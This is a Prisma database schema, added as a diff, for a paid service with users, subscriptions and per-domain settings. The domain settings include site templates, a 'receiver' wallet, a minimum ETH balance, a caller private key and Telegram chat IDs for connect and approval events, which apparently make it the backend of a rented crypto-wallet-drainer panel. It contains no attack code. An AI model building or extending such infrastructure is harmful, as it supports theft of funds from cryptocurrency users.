@@ -1,0 +1,81 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "mysql"
+  url      = "mysql://root:root@127.0.0.1:3306/aptos"
+}
+
+model Users {
+  id              Int            @id @default(autoincrement())
+  email           String         @unique
+  email_confirmed Boolean        @default(false)
+  password        String
+  balance         Float          @default(0)
+  role            Roles          @default(USER)
+  subscription    Subscriptions?
+  created_at      DateTime       @default(now())
+  updated_at      DateTime       @updatedAt
+  domains         Domains[]
+  payments        Payments[]
+}
+
+model Domains {
+  id             Int        @id @default(autoincrement())
+  host           String     @unique
+  owner          Users      @relation(fields: [user_id], references: [id])
+  user_id        Int
+  path_name      String
+  template       Templates? @relation(fields: [template_id], references: [id])
+  template_id    Int
+  coval_api_key  String
+  infura_api_key String
+  receiver       String
+  min_eth_bal    Float
+  chain_id       String
+  caller_addr    String
+  caller_pk      String
+  tg_token       String
+  chat_id_err    String
+  chat_id_con    String
+  chat_id_app    String
+}
+
+model Templates {
+  id          Int       @id @default(autoincrement())
+  name        String
+  description String
+  domains     Domains[]
+}
+
+model Subscriptions {
+  id         Int              @id @default(autoincrement())
+  user       Users            @relation(fields: [user_id], references: [id])
+  user_id    Int              @unique
+  type       SubscriptionType
+  expires_in DateTime?
+  created_at DateTime         @default(now())
+}
+
+model Payments {
+  id                 Int      @id @default(autoincrement())
+  id_from_pay_system String   @unique
+  amount_in_rub      Float
+  amount_in_usd      Float
+  created_at         DateTime @default(now())
+  user               Users?   @relation(fields: [user_id], references: [id])
+  user_id            Int?
+}
+
+enum Roles {
+  USER
+  MODERATOR
+  ADMIN
+  DEVELOPER
+}
+
+enum SubscriptionType {
+  WORKER
+  MONTH
+}
